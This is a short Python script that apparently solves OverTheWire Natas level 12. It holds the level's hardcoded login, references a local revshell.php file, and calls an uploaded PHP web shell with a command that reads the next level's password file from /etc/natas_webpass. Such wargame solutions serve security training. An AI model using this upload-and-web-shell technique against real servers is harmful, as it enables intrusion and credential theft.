import requests

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'


url = 'http://%s.natas.labs.overthewire.org'  % username

files = {'uploadedfile': open('/home/alpha/over_the_wire/natas/level12/revshell.php', 'rb')}

response = requests.post(url + '/upload/156ypamc60.php?c=cat /etc/natas_webpass/natas13', auth = (username, password))
print(response.text)
 